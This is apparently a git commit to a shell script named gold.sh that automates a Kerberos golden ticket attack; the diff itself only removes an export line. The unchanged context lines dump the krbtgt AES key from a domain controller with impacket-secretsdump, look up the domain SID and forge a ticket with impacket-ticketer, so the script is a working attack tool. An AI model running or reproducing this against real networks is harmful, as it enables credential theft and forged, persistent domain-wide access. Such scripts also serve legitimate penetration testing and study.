989826098bd783656c46505b9b26e5c25a173cbe
hgwj <marshallung844@gmail.com>
2024-03-01 17:45:19 -0800

    Useless export

--- gold.sh
+++ gold.sh
@@ -8,5 +8,5 @@ fi
 aes=$(impacket-secretsdump $2/$3:$4@$1 -just-dc-user krbtgt | grep aes256 | awk -F ":" '{print $3}')
 SID=$(impacket-lookupsid $2/$3:$4@$1 0 | grep Domain | awk '{print $5}' )
 impacket-ticketer -aesKey $aes -domain-sid $SID -domain $2 $3
-export KRB5CCNAME=$3.ccache
+
 
